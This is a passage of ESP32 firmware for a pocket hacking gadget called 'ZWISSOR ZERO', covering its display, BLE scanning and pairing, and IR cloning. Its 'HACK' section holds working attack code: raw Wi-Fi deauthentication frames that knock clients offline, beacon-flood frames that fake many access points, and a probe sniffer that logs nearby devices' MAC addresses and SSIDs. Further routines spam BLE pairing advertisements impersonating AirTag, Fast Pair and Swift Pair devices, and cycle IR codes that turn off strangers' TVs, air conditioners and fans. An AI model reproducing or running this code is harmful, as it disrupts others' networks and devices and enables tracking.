    default: oledRenderMain(); break;
  }
  
  oledNeedsRedraw = false;
  oledLastDraw = millis();
}

void initOLED() {
  Wire.begin(OLED_SDA, OLED_SCL);
  Wire.setClock(400000);
  
  if (u8g2.begin()) {
    u8g2.setContrast(OLED_CONTRAST_NORMAL);
    u8g2.clearBuffer();
    
    // Draw "Z" logo frame
    u8g2.drawFrame(44, 6, 40, 40);
    
    // Draw large Z inside frame
    u8g2.setFont(u8g2_font_10x20_tf);
    u8g2.drawStr(54, 32, "Z");
    
    // Title
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(14, 54, "ZWISSOR ZERO");
    
    // Byline
    u8g2.setFont(u8g2_font_4x6_tf);
    u8g2.drawStr(42, 62, "by Zalan");
    
    u8g2.sendBuffer();
    oledInitialized = true;
    oledLastActivity = millis();
    addLog("[OLED] Display initialized (400KHz)");
  } else {
    addLog("[OLED] Display init FAILED");
  }
}

void addLog(const char* fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    logBuffer[logIndex] = String(buf);
    logIndex = (logIndex + 1) % MAX_LOG_LINES;
    if (logCount < MAX_LOG_LINES) logCount++;
    Serial.println(buf);
}

String getLogs() {
    String result = "[";
    int start = (logCount < MAX_LOG_LINES) ? 0 : logIndex;
    int count = (logCount < MAX_LOG_LINES) ? logCount : MAX_LOG_LINES;
    for (int i = 0; i < count; i++) {
        int idx = (start + i) % MAX_LOG_LINES;
        if (i > 0) result += ",";
        result += "\""; String line = logBuffer[idx];
        for (size_t j = 0; j < line.length(); j++) { char c = line.charAt(j); if (c == '"') result += "\\\""; else if (c == '\\') result += "\\\\"; else if (c == '\n') result += "\\n"; else if (c == '\r') continue; else result += c; }
        result += "\"";
    }
    result += "]"; return result;
}

// ===================== UTILITY ==============================
String macToString(const uint8_t* mac) { char buf[18]; snprintf(buf,sizeof(buf),"%02X:%02X:%02X:%02X:%02X:%02X",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]); return String(buf); }

void stringToMac(const String& s, uint8_t* mac) {
    int vals[6]; if (sscanf(s.c_str(),"%x:%x:%x:%x:%x:%x",&vals[0],&vals[1],&vals[2],&vals[3],&vals[4],&vals[5])==6) for(int i=0;i<6;i++) mac[i]=(uint8_t)vals[i];
}

String randomStr(const char* arr[], int count) { return String(arr[random(0, count)]); }

// ===================== PREFERENCES ==========================
void loadConfig() { prefs.begin("zwisser",false); apSsid=prefs.getString("ssid",DEFAULT_AP_SSID); apPass=prefs.getString("pass",DEFAULT_AP_PASS); btName=prefs.getString("btname",BT_DEVICE_NAME); staSsid=prefs.getString("staSsid",""); staPass=prefs.getString("staPass",""); themeIndex=prefs.getInt("theme",0); if(themeIndex<0||themeIndex>=MAX_THEMES)themeIndex=0; prefs.end(); }
void saveConfig(const String& ssid, const String& pass) { prefs.begin("zwisser",false); prefs.putString("ssid",ssid); prefs.putString("pass",pass); prefs.end(); }
void saveBtName(const String& name) { prefs.begin("zwisser",false); prefs.putString("btname",name); prefs.end(); }
void saveStationConfig(const String& ssid, const String& pass) { prefs.begin("zwisser",false); prefs.putString("staSsid",ssid); prefs.putString("staPass",pass); prefs.end(); }
void forgetStationConfig() { prefs.begin("zwisser",false); prefs.putString("staSsid",""); prefs.putString("staPass",""); prefs.end(); }
void saveThemeIndex(int idx) { prefs.begin("zwisser",false); prefs.putInt("theme",idx); prefs.end(); themeIndex=idx; }
void saveAcBrand(int brand) { prefs.begin("zwisser",false); prefs.putInt("acBrand",brand); prefs.end(); oledState.acBrand = brand; }
int loadAcBrand() { prefs.begin("zwisser",false); int b = prefs.getInt("acBrand",0); prefs.end(); return b; }

// ===================== BLE SCAN =============================
String performBleScan() {
    bool wasInit=nimbleInitialized, wasAdv=btAdvertising;
    if(wasAdv&&pAdvertising)pAdvertising->stop();
    if(!wasInit){NimBLEDevice::init(btName.c_str());nimbleInitialized=true;addLog("[BT] BLE init for scan");}
    NimBLEScan* s=NimBLEDevice::getScan(); s->setActiveScan(true); s->setInterval(100); s->setWindow(99); s->start(3000,true);
    NimBLEScanResults r=s->getResults(); int c=r.getCount(); addLog("[BT] Scan: %d devices",c);
    String j="";
    for(int i=0;i<c;i++){
        const NimBLEAdvertisedDevice* d=r.getDevice(i);
        String n=String(d->getName().c_str()); if(n.length()==0)n="Unknown";
        String m=String(d->getAddress().toString().c_str()); int rssi=d->getRSSI();
        if(j.length()>0)j+=","; j+="{\"name\":\""; for(size_t k=0;k<n.length();k++){char ch=n.charAt(k);if(ch=='"')j+="\\\"";else if(ch=='\\')j+="\\\\";else j+=ch;}
        j+="\",\"mac\":\""+m+"\",\"rssi\":"+String(rssi)+"}";
    }
    s->clearResults();
    if(wasAdv&&pAdvertising){pAdvertising->start();addLog("[BT] Adv resumed");}else if(!wasInit){NimBLEDevice::deinit();nimbleInitialized=false;addLog("[BT] BLE deinit");}
    return "["+j+"]";
}

// ===================== PAIRED DEVICES =======================
struct PairedDevice{String name;String mac;};
PairedDevice pairedDevices[MAX_PAIRED_DEVICES]; int pairedCount=0;

void loadPairedDevices(){
    prefs.begin("zwisser",false); pairedCount=prefs.getInt("pairedCnt",0); if(pairedCount>MAX_PAIRED_DEVICES)pairedCount=MAX_PAIRED_DEVICES;
    for(int i=0;i<pairedCount;i++){pairedDevices[i].name=prefs.getString(("pName"+String(i)).c_str(),"");pairedDevices[i].mac=prefs.getString(("pMac"+String(i)).c_str(),"");} prefs.end();
}
void savePairedDevices(){
    prefs.begin("zwisser",false); prefs.putInt("pairedCnt",pairedCount);
    for(int i=0;i<pairedCount;i++){prefs.putString(("pName"+String(i)).c_str(),pairedDevices[i].name);prefs.putString(("pMac"+String(i)).c_str(),pairedDevices[i].mac);} prefs.end();
}
bool isAlreadyPaired(const String& m){for(int i=0;i<pairedCount;i++){if(pairedDevices[i].mac==m)return true;}return false;}
String addPairedDevice(const String& n,const String& m){if(isAlreadyPaired(m))return "ALREADY PAIRED";if(pairedCount>=MAX_PAIRED_DEVICES)return "PAIRED LIST FULL";pairedDevices[pairedCount].name=n;pairedDevices[pairedCount].mac=m;pairedCount++;savePairedDevices();addLog("[BT] Paired: %s (%s)",n.c_str(),m.c_str());return "PAIRED OK";}
bool removePairedDevice(int i){if(i<0||i>=pairedCount)return false;for(int j=i;j<pairedCount-1;j++)pairedDevices[j]=pairedDevices[j+1];pairedCount--;savePairedDevices();return true;}
String getPairedDevicesJson(){String j="[";for(int i=0;i<pairedCount;i++){if(i>0)j+=",";j+="{\"name\":\"";String n=pairedDevices[i].name;for(size_t k=0;k<n.length();k++){char c=n.charAt(k);if(c=='"')j+="\\\"";else if(c=='\\')j+="\\\\";else j+=c;}j+="\",\"mac\":\""+pairedDevices[i].mac+"\"}";}j+="]";return j;}

String performBlePair(const String& mac) {
    bool wasInit=nimbleInitialized,wasAdv=btAdvertising;
    if(wasAdv&&pAdvertising)pAdvertising->stop();
    if(!wasInit){NimBLEDevice::init(btName.c_str());nimbleInitialized=true;}
    NimBLEAddress addr(std::string(mac.c_str()),0); NimBLEClient* pC=NimBLEDevice::createClient();
    addLog("[BT] Pairing %s...",mac.c_str()); bool paired=false;
    if(pC->connect(addr)){if(pC->secureConnection()){paired=true;addLog("[BT] Paired: %s",mac.c_str());}else{addLog("[BT] Resp from: %s",mac.c_str());paired=true;}pC->disconnect();}else addLog("[BT] FAILED %s",mac.c_str());
    NimBLEDevice::deleteClient(pC);
    if(wasAdv&&pAdvertising)pAdvertising->start();else if(!wasInit){NimBLEDevice::deinit();nimbleInitialized=false;}
    return paired?"PAIRED OK":"PAIR FAILED";
}

// ===================== WIFI DEAUTH ATTACK ==================
void sendDeauthPacket(const uint8_t* t,const uint8_t* a,uint8_t ch,uint8_t reason){
    uint8_t p[DEAUTH_PACKET_LEN]={0}; p[0]=0xC0;p[1]=0x00;p[2]=0x00;p[3]=0x00;
    memcpy(p+4,t,6);memcpy(p+10,a,6);memcpy(p+16,a,6);p[22]=0x00;p[23]=0x00;p[24]=reason;p[25]=0x00;
    esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);delay(1);esp_wifi_80211_tx(WIFI_IF_AP,p,DEAUTH_PACKET_LEN,false);
}
void stopDeauth(){deauthRunning=false;}
void startDeauth(){deauthRunning=true;addLog("[HACK] Deauth ch%d rate:%dms reason:%d",deauthChannel,deauthRate,deauthReason);}

// ===================== BEACON FLOOD ========================
void stopBeaconFlood(){beaconRunning=false;}
void startBeaconFlood(){beaconRunning=true;addLog("[HACK] Beacon: %d APs enc:%s",beaconCount,beaconEncryption.c_str());}

// ===================== PROBE SNIFFER =======================
void wifiPromiscuousRx(void* buf,wifi_promiscuous_pkt_type_t type){
    if(type==WIFI_PKT_MGMT){
        wifi_promiscuous_pkt_t* pkt=(wifi_promiscuous_pkt_t*)buf; uint8_t* f=pkt->payload;
        if((f[0]&0xFC)==0x40&&probeResultCount<MAX_PROBE_RESULTS){
            String mac=macToString(f+10),ssid=""; int pos=24;
            while(pos<pkt->rx_ctrl.sig_len-2&&pos<200){uint8_t tn=f[pos],tl=f[pos+1];if(tn==0){for(int i=0;i<tl&&i<32;i++){char c=f[pos+2+i];if(c>=32&&c<127)ssid+=c;}break;}pos+=2+tl;if(tl==0)break;}
            if(ssid.length()==0)ssid="(Broadcast)"; int rssi=pkt->rx_ctrl.rssi,ch=pkt->rx_ctrl.channel;
            char b[128]; snprintf(b,sizeof(b),"{\"mac\":\"%s\",\"ssid\":\"%s\",\"rssi\":%d,\"ch\":%d}",mac.c_str(),ssid.c_str(),rssi,ch);
            probeResults[probeResultCount++]=String(b);
        }
    }
}
void startProbeSniffer(){probeResultCount=0;probeSniffing=true;esp_wifi_set_promiscuous(true);esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousRx);addLog("[HACK] Probe sniffer started");}
void stopProbeSniffer(){probeSniffing=false;esp_wifi_set_promiscuous(false);addLog("[HACK] Probe sniffer stopped");}

// ===================== BLE ADVERTISING HELPERS ==============
void sendBleMfgAdv(uint16_t companyId,const uint8_t* data,uint8_t dataLen,const char* name,uint16_t appearance){
    bool needCleanup=false;
    if(!nimbleInitialized){NimBLEDevice::init("");needCleanup=true;}
    NimBLEAdvertising* pAdv=NimBLEDevice::getAdvertising(); pAdv->stop();
    NimBLEAdvertisementData advData; std::string mfg;
    mfg+=(char)(companyId&0xFF); mfg+=(char)((companyId>>8)&0xFF);
    for(int i=0;i<dataLen;i++)mfg+=(char)data[i];
    advData.addData((const uint8_t*)mfg.data(),mfg.size());
    String advName=name; if(bleNameRandomizerRunning||strlen(name)==0)advName=randomStr(randomBtNames,25);
    if(advName.length()>0)advData.setName(advName.c_str());
    if(appearance!=0)advData.setAppearance(appearance);
    pAdv->setAdvertisementData(advData);pAdv->start();
    if(needCleanup){delay(BLE_SPAM_INTERVAL_MS);pAdv->stop();NimBLEDevice::deinit();}
}

void sendAirTagAdv(){uint8_t d[23];for(int i=0;i<23;i++)d[i]=random(0,256);d[0]=0x12;d[1]=0x19;sendBleMfgAdv(AIRTAG_MFG_ID,d,23,"AirTag",0x0540);}
void sendSmartTagAdv(){uint8_t d[20];for(int i=0;i<20;i++)d[i]=random(0,256);d[0]=0x03;sendBleMfgAdv(SAMSUNG_MFG_ID,d,20,"Samsung SmartTag",0x0541);}
void sendSwiftPairAdv(){uint8_t d[16];for(int i=0;i<16;i++)d[i]=random(0,256);d[0]=0x03;d[1]=0x00;sendBleMfgAdv(MSFT_MFG_ID,d,16,"Swift Pair Device",0x03C0);}
void sendGoogleFastPairAdv(){uint8_t d[17];for(int i=0;i<17;i++)d[i]=random(0,256);d[0]=0x02;d[1]=0x01;sendBleMfgAdv(GOOGLE_MFG_ID,d,17,"Pixel Buds",0x03C2);}
void sendIBeaconAdv(){uint8_t d[21];for(int i=0;i<16;i++)d[i]=random(0,256);d[16]=random(0,256);d[17]=random(0,256);d[18]=random(0,256);d[19]=random(0,256);d[20]=0xC5;sendBleMfgAdv(APPLE_IBEACON_MFG_ID,d,21,"",0x0000);}
void sendEddystoneUrlAdv(){uint8_t d[20];d[0]=0x10;d[1]=0x00;for(int i=2;i<18;i++)d[i]=random(0,256);d[18]=0x00;d[19]=0x00;sendBleMfgAdv(EDDYSTONE_MFG_ID,d,20,"",0x0000);}
void sendBlePairSpamAdv(){uint8_t d[10];for(int i=0;i<10;i++)d[i]=random(0,256);uint16_t c[]={0x004C,0x0075,0x0006,0x0059,0x00E0,0x000A,0x00F0,0x0050,0x0030,0x00A0};sendBleMfgAdv(c[random(0,10)],d,10,"BT Device",0x0000);}

// ===================== CHANNEL HOPPING ======================
void stopChannelHopping(){channelHoppingRunning=false;}
void startChannelHopping(){channelHoppingRunning=true;currentHopChannel=1;addLog("[HACK] Channel hopping started");}

// ===================== HACKY LOOP ===========================
unsigned long lastDeauthTick=0,lastBeaconTick=0,lastAirtagTick=0,lastSmarttagTick=0;
unsigned long lastSwiftpairTick=0,lastGfpTick=0,lastIbeaconTick=0,lastEddystoneTick=0,lastBleSpamTick=0,lastHopTick=0;
int beaconIndex=0;

void runHackyLoop(){
    if(channelHoppingRunning&&millis()-lastHopTick>200){lastHopTick=millis();currentHopChannel=(currentHopChannel%MAX_CHANNELS)+1;deauthChannel=currentHopChannel;}
    if(deauthRunning&&millis()-lastDeauthTick>deauthRate){
        lastDeauthTick=millis();
        if(deauthAllChannels){for(int ch=1;ch<=11;ch++){sendDeauthPacket(deauthTarget,deauthAP,ch,deauthReason);delay(1);}}
        else sendDeauthPacket(deauthTarget,deauthAP,deauthChannel,deauthReason);
    }
    if(beaconRunning&&millis()-lastBeaconTick>100){
        lastBeaconTick=millis();
        String ssid=beaconRandomSsids?randomStr(randomSsids,22):beaconPrefix+String(beaconIndex);
        if(ssid.length()>31)ssid=ssid.substring(0,31);
        beaconMacBase[4]=(beaconIndex>>8)&0xFF;beaconMacBase[5]=beaconIndex&0xFF;
        uint8_t b[BEACON_PACKET_LEN]={0};int pos=0;
        b[pos++]=0x80;b[pos++]=0x00;b[pos++]=0x00;b[pos++]=0x00;
        memset(b+pos,0xFF,6);pos+=6;memcpy(b+pos,beaconMacBase,6);pos+=6;memcpy(b+pos,beaconMacBase,6);pos+=6;
        b[pos++]=0x00;b[pos++]=0x00;
        for(int i=0;i<8;i++)b[pos++]=random(0,256);
        b[pos++]=0x64;b[pos++]=0x00;
        if(beaconEncryption=="WPA2"||beaconEncryption=="WPA3"||beaconEncryption=="WPA2ENT"){b[pos++]=0x11;b[pos++]=0x00;}else{b[pos++]=0x04;b[pos++]=0x00;}
        b[pos++]=0x00;b[pos++]=ssid.length();memcpy(b+pos,ssid.c_str(),ssid.length());pos+=ssid.length();
        b[pos++]=0x01;b[pos++]=0x08;b[pos++]=0x82;b[pos++]=0x84;b[pos++]=0x8B;b[pos++]=0x96;b[pos++]=0x0C;b[pos++]=0x12;b[pos++]=0x18;b[pos++]=0x24;
        b[pos++]=0x03;b[pos++]=0x01;b[pos++]=deauthChannel;
        if(beaconEncryption=="WPA2"||beaconEncryption=="WPA2ENT"){
            b[pos++]=0x30;b[pos++]=0x14;b[pos++]=0x01;b[pos++]=0x00;b[pos++]=0x00;b[pos++]=0x0F;b[pos++]=0xAC;b[pos++]=0x04;
            b[pos++]=0x01;b[pos++]=0x00;b[pos++]=0x00;b[pos++]=0x0F;b[pos++]=0xAC;b[pos++]=0x04;b[pos++]=0x01;b[pos++]=0x00;
            if(beaconEncryption=="WPA2ENT"){b[pos++]=0x00;b[pos++]=0x01;}else{b[pos++]=0x00;b[pos++]=0x02;}
            b[pos++]=0x00;b[pos++]=0x00;
        }
        if(beaconEncryption=="WPA3"){
            b[pos++]=0x30;b[pos++]=0x14;b[pos++]=0x01;b[pos++]=0x00;b[pos++]=0x00;b[pos++]=0x0F;b[pos++]=0xAC;b[pos++]=0x04;
            b[pos++]=0x01;b[pos++]=0x00;b[pos++]=0x00;b[pos++]=0x0F;b[pos++]=0xAC;b[pos++]=0x04;b[pos++]=0x01;b[pos++]=0x00;
            b[pos++]=0x00;b[pos++]=0x08;b[pos++]=0x00;b[pos++]=0x00;
        }
        esp_wifi_set_channel(deauthChannel,WIFI_SECOND_CHAN_NONE);delay(1);
        esp_wifi_80211_tx(WIFI_IF_AP,b,pos,false);
        beaconIndex=(beaconIndex+1)%beaconCount;
    }
    if(airtagSpamRunning&&millis()-lastAirtagTick>BLE_SPAM_INTERVAL_MS){lastAirtagTick=millis();sendAirTagAdv();}
    if(smarttagSpamRunning&&millis()-lastSmarttagTick>BLE_SPAM_INTERVAL_MS){lastSmarttagTick=millis();sendSmartTagAdv();}
    if(swiftpairSpamRunning&&millis()-lastSwiftpairTick>BLE_SPAM_INTERVAL_MS){lastSwiftpairTick=millis();sendSwiftPairAdv();}
    if(googleFastPairRunning&&millis()-lastGfpTick>BLE_SPAM_INTERVAL_MS){lastGfpTick=millis();sendGoogleFastPairAdv();}
    if(ibeaconRunning&&millis()-lastIbeaconTick>BLE_SPAM_INTERVAL_MS){lastIbeaconTick=millis();sendIBeaconAdv();}
    if(eddystoneRunning&&millis()-lastEddystoneTick>BLE_SPAM_INTERVAL_MS){lastEddystoneTick=millis();sendEddystoneUrlAdv();}
    if(bleSpamRunning&&millis()-lastBleSpamTick>BLE_SPAM_INTERVAL_MS*2){lastBleSpamTick=millis();sendBlePairSpamAdv();}
}

// ===================== TV-B-GONE LOOP =======================
unsigned long lastTvbgoneTick = 0;
int tvbgoneIndex = 0;

// CoolBeGone non-blocking state
int coolBeGoneIndex = 0;    // index within the current layer
int coolBeGoneLayer = 0;    // 0=AC protocols, 1=Fan codes

// Common TV power codes (NEC protocol)
const uint64_t tvPowerCodes[] = {
    0x20DF10EF, // Samsung
    0xE0E040BF, // LG
    0x10EF,     // NEC generic
    0x807F,     // NEC extended
    0x00FF,     // Sony
    0x48B7,     // Panasonic
    0x1C80,     // Toshiba
    0xC102,     // Philips
    0x02FD,     // Sharp
    0x8687      // Mitsubishi
};
const int tvPowerCodeCount = 10;

// ===================== MUSIC PLAYBACK LOOP =====================
void runMusicLoop() {
  if (!musicPlaying) return;
  unsigned long now = millis();
  if (now - lastMusicTick < 5) return; // check every 5ms
  lastMusicTick = now;
  
  const SongNote* song = songs[musicSongIndex];
  SongNote note = song[musicNoteIndex];
  
  // Check if we hit end marker (freq=0, dur=500 end marker)
  if (note.freq == 0 && note.dur >= 500) {
    // Song ended, auto-loop
    musicNoteIndex = 0;
    note = song[0];
  }
  
  // Check if current note duration has elapsed
  static unsigned long noteStartTime = 0;
  static bool notePlaying = false;
  
  if (!notePlaying) {
    // Start new note
    if (note.freq == 0 || note.freq == PAUSE) {
      noTone(BUZZER_PIN);
    } else {
      tone(BUZZER_PIN, note.freq, note.dur);
    }
    noteStartTime = now;
    notePlaying = true;
  } else if (now - noteStartTime >= note.dur) {
    // Move to next note
    musicNoteIndex++;
    notePlaying = false;
    // If we hit end, stop
    SongNote nextNote = song[musicNoteIndex];
    if (nextNote.freq == 0 && nextNote.dur >= 500) {
      // Song complete, loop
      musicNoteIndex = 0;
      addLog("[MUSIC] Loop: %s", songNames[musicSongIndex]);
    }
  }
}

void runTvbgoneLoop() {
    if (millis() - lastTvbgoneTick < 200) return;
    lastTvbgoneTick = millis();
    if (tvbgoneIndex < tvPowerCodeCount * 3) { // cycle 3 times
        int idx = tvbgoneIndex % tvPowerCodeCount;
        irsend.sendNEC(tvPowerCodes[idx], 32);
        tvbgoneIndex++;
    } else {
        tvbgoneRunning = false;
        addLog("[IR] TV-B-Gone cycle complete");
    }
}

unsigned long lastCoolBeGoneTick = 0;

void runCoolBeGone() {
    if (millis() - lastCoolBeGoneTick < 120) return;
    lastCoolBeGoneTick = millis();
    
    if (!coolBeGoneRunning) return;
    
    // Layer A: AC Power-Off Sequences (8 major protocols)
    if (coolBeGoneLayer == 0) {
        decode_type_t acProtocols[] = {
            decode_type_t::COOLIX,
            decode_type_t::GREE,
            decode_type_t::HAIER_AC,
            decode_type_t::HAIER_AC160,
            decode_type_t::KELVINATOR,
            decode_type_t::MITSUBISHI,
            decode_type_t::DAIKIN,
            decode_type_t::PANASONIC_AC
        };
        const int acCount = 8;
        
        if (coolBeGoneIndex == 0) {
            addLog("[IR] CoolBeGone starting Layer A - AC Power Off");
            irac.next.power = false;
            irac.next.degrees = 24;
            irac.next.mode = stdAc::opmode_t::kCool;
            irac.next.fanspeed = stdAc::fanspeed_t::kAuto;
            irac.next.swingv = stdAc::swingv_t::kOff;
            irac.next.swingh = stdAc::swingh_t::kOff;
            irac.next.light = false;
            irac.next.sleep = -1;
        }
        
        if (coolBeGoneIndex < acCount) {
            irac.next.protocol = acProtocols[coolBeGoneIndex];
            irac.sendAc();
            coolBeGoneIndex++;
            return;
        }
        
        // Done with Layer A, move to Layer B
        coolBeGoneLayer = 1;
        coolBeGoneIndex = 0;
        addLog("[IR] CoolBeGone Layer A complete, starting Layer B - Fan codes");
    }
    
    // Layer B: Remote-Controlled Fan Power-Off Sequences
    if (coolBeGoneLayer == 1) {
        uint64_t fanCodes[] = {
            0x807FA05FULL,      // Local Pakistani ceiling fan toggle (NEC 32-bit)
            0x02FDULL,          // Generic Chinese fan remote regulator (NEC 16-bit)
            0x00FF00FFULL,      // Universal clean NEC structural power frame
            0x3445A25DULL,      // KDK / Panasonic ceiling fan system off
            0x40040100BCULL     // Alternate Panasonic 48-bit structural fan kill frame
        };
        const int fanCount = 5;
        
        if (coolBeGoneIndex < fanCount) {
            irsend.sendNEC((uint32_t)fanCodes[coolBeGoneIndex], 32);
            if (fanCodes[coolBeGoneIndex] == 0x40040100BCULL) {
                irsend.sendPanasonic(0x4004, (uint32_t)(fanCodes[coolBeGoneIndex] & 0xFFFFFFFF));
            }
            coolBeGoneIndex++;
            return;
        }
        
        // All done
        coolBeGoneRunning = false;
        coolBeGoneLayer = 0;
        coolBeGoneIndex = 0;
        addLog("[IR] CoolBeGone complete");
    }
}

// ===================== RAW BUFFER MICROSECOND CONVERSION ======================
// Convert IR capture timer ticks to absolute microseconds for sendRaw()
// rawbuf from IRrecv stores timing in ticks (50us per tick at default 1MHz / 50 = 20KHz)
// The first entry is the size of the gap, rawlen excludes it.
// Returns the number of raw elements written to outBuf (the value to pass to sendRaw).
uint16_t resultToRawBufMicoseconds(decode_results *results, uint16_t *outBuf, uint16_t maxLen) {
    uint16_t count = results->rawlen;
    if (count < 2) return 0;
    // rawlen includes the leading gap in rawbuf[0]; we want just the mark/space pairs
    uint16_t usable = count - 1;
    if (usable > maxLen) usable = maxLen;
    for (uint16_t i = 1; i <= usable; i++) {
        // rawbuf[i] is in timer ticks; multiply by 50 for approximate microseconds
        // Use 50 as default tick period for ESP32-S3 with IRremote library
        outBuf[i - 1] = (uint16_t)((uint32_t)results->rawbuf[i] * 50U);
    }
    return usable;
}

// ===================== IR LOOP ==============================
void runIrLoop() {
    // If raw recording mode active, listen for decode
    if (irReadingRaw) {
        if (irrecv.decode(&irResults)) {
            // Populate last known signal state
            lastIrProtocol = typeToString(irResults.decode_type, irResults.decode_type);
            lastIrValue = resultToHexidecimal(&irResults);
            lastIrBits = irResults.bits;
            
            if (lastRawBuf) free(lastRawBuf);
            uint16_t usableLen = (irResults.rawlen > 1) ? (irResults.rawlen - 1) : 0;
            if (usableLen > 150) usableLen = 150;
            if (usableLen > 0) {
                lastRawBuf = (uint16_t*)malloc(usableLen * sizeof(uint16_t));
                lastRawLen = resultToRawBufMicoseconds(&irResults, lastRawBuf, usableLen);
            } else {
                lastRawBuf = nullptr;
                lastRawLen = 0;
            }
            
            addLog("[IR] Captured: %s 0x%s (%d bits, %d raw frames)", 
                   lastIrProtocol.c_str(), lastIrValue.c_str(), lastIrBits, lastRawLen);
            
            irrecv.disableIRIn();
            irReadingRaw = false;
            irReading = false;
        }
        if (millis() - irRecordStart > 10000) {
            irrecv.disableIRIn();
            irReadingRaw = false;
            irReading = false;
            addLog("[IR] Record timeout - no signal captured");
        }
    }
    
    if (tvbgoneRunning) {
        runTvbgoneLoop();
    }
}

// ===================== IR CLONER: AUTO-SAVE TO SIGNALS LIBRARY =====================
int getNextAutoSignalIndex() {
    DynamicJsonDocument doc(4096);
    DeserializationError err = deserializeJson(doc, signalsJson);
    if (err) return 1;
    int maxIdx = 0;
    JsonArray arr = doc.as<JsonArray>();
    for (JsonObject s : arr) {
        const char* name = s["name"] | "";
        int n;
        if (sscanf(name, "Signal %d", &n) == 1) {
            if (n > maxIdx) maxIdx = n;
        }
    }
    return maxIdx + 1;
}

void captureAndAutoSaveToLibrary() {
    addLog("[CLONER] IR capture started - point remote at receiver...");
    
    irrecv.enableIRIn();
    irReading = true;
    
    unsigned long captureStart = millis();
    bool captured = false;
    int lastDisplayedSec = -1;
    
    while (millis() - captureStart < 10000) {
        if (irrecv.decode(&irResults)) {
            captured = true;
            break;
        }
        
        // Update countdown every second
        int remainingSec = 10 - ((millis() - captureStart) / 1000);
        if (remainingSec != lastDisplayedSec) {
            lastDisplayedSec = remainingSec;
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_5x7_tf);
            oledDrawTopBar();
            u8g2.drawStr(2, 28, "LISTENING...");
            char countdownBuf[12];
            snprintf(countdownBuf, sizeof(countdownBuf), "Timeout: %ds", remainingSec);
            u8g2.drawStr(2, 40, countdownBuf);
            u8g2.drawStr(2, 52, "Point remote at RX");
            u8g2.sendBuffer();
        }
        
        yield();
        delay(10);
    }
    
    if (!captured) {
        addLog("[CLONER] Capture timeout - no signal received");
        // Show timeout feedback
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_5x7_tf);
        oledDrawTopBar();
        u8g2.drawStr(2, 30, "TIMEOUT");
        u8g2.drawStr(2, 42, "No signal received");
        u8g2.sendBuffer();
        delay(1200);
        irrecv.disableIRIn();
        irReading = false;
        oledNeedsRedraw = true;
        return;
    }
    
    // Determine next auto-name
    int sigIdx = getNextAutoSignalIndex();
    String sigName = "Signal " + String(sigIdx);
    
    // Extract protocol, value, bits
    String protoStr = typeToString(irResults.decode_type, irResults.decode_type);
    uint64_t rawValue = irResults.value;
    int bits = irResults.bits;
    
    // Format value as hex string
    char hexBuf[20];
    snprintf(hexBuf, sizeof(hexBuf), "0x%llX", rawValue);
    
    addLog("[CLONER] Captured: %s %s (%d bits)", protoStr.c_str(), hexBuf, bits);
    
    // Append to existing signalsJson array
    DynamicJsonDocument doc(4096);
    DeserializationError err = deserializeJson(doc, signalsJson);
    if (err) {
        doc.clear();
        doc.to<JsonArray>();
    }
    JsonArray arr = doc.as<JsonArray>();
    
    JsonObject newSig = arr.createNestedObject();
    newSig["name"] = sigName;
    newSig["protocol"] = (int)irResults.decode_type;
    newSig["value"] = String(hexBuf);
    newSig["bits"] = bits;
    
    // Serialize and save
    String output;
    serializeJson(doc, output);
    signalsJson = output;
    
    File f = LittleFS.open("/signals.json", "w");
    if (f) {
        f.print(output);
        f.close();
        addLog("[CLONER] Saved '%s' to signals library (%d bytes)", sigName.c_str(), output.length());
    } else {
        addLog("[CLONER] ERROR: Could not write to /signals.json");
    }
    
    irrecv.disableIRIn();
    irReading = false;
    irReadingRaw = false;
    lastIrProtocol = protoStr;
    lastIrValue = String(hexBuf);
    lastIrBits = bits;
    oledNeedsRedraw = true;
    addLog("[CLONER] Clone complete: %s %s (%d bits)", protoStr.c_str(), hexBuf, bits);
}

// ===================== SYSTEM STATS ==========================
String getSystemStatsJson() {
    float tempC = temperatureRead();
    String wifiRssi = "N/A";
    String wifiIp = "N/A";
    String wifiMode = "AP";
    int apClients = 0;
    if (WiFi.getMode() & WIFI_MODE_STA && WiFi.status() == WL_CONNECTED) {
        wifiRssi = String(WiFi.RSSI()) + " dBm";
        wifiIp = WiFi.localIP().toString();
        wifiMode = "STA+AP";
    } else {
        wifiIp = WiFi.softAPIP().toString();
    }
    wifi_sta_list_t staList;
    esp_wifi_ap_get_sta_list(&staList);
    apClients = staList.num;
    String chipModel = ESP.getChipModel();
    String chipRev = String(ESP.getChipRevision());
    int cpuCores = ESP.getChipCores();
    uint32_t freeHeap = ESP.getFreeHeap();
    uint32_t totalHeap = ESP.getHeapSize();
    uint32_t freePsram = ESP.getFreePsram();
    uint32_t totalPsram = ESP.getPsramSize();
    uint32_t freeSketch = ESP.getFreeSketchSpace();
    uint32_t cpuFreq = ESP.getCpuFreqMHz();
    uint32_t uptimeSec = millis() / 1000;
    String freeHeapStr = String(freeHeap / 1024) + " KB";
    String totalHeapStr = String(totalHeap / 1024) + " KB";
    String freePsramStr = (totalPsram > 0) ? (String(freePsram / 1024) + " KB") : "N/A";
    String totalPsramStr = (totalPsram > 0) ? (String(totalPsram / 1024) + " KB") : "N/A";
    String freeSketchStr = String(freeSketch / 1024) + " KB";
    char json[1024];
    snprintf(json, sizeof(json),
        "{" "\"tempC\":%.1f," "\"cpuFreq\":%u," "\"cpuCores\":%d," "\"chipModel\":\"%s\"," "\"chipRev\":\"%s\","
        "\"freeHeap\":%u," "\"totalHeap\":%u," "\"freeHeapStr\":\"%s\"," "\"totalHeapStr\":\"%s\","
        "\"freePsram\":%u," "\"totalPsram\":%u," "\"freePsramStr\":\"%s\"," "\"totalPsramStr\":\"%s\","
        "\"freeSketchStr\":\"%s\"," "\"wifiRssi\":\"%s\"," "\"wifiIp\":\"%s\"," "\"wifiMode\":\"%s\","
        "\"apClients\":%d," "\"uptimeSec\":%u" "}",
        (double)tempC, cpuFreq, cpuCores, chipModel, chipRev.c_str(),
        freeHeap, totalHeap, freeHeapStr.c_str(), totalHeapStr.c_str(),
        freePsram, totalPsram, freePsramStr.c_str(), totalPsramStr.c_str(),
        freeSketchStr.c_str(), wifiRssi.c_str(), wifiIp.c_str(), wifiMode.c_str(),
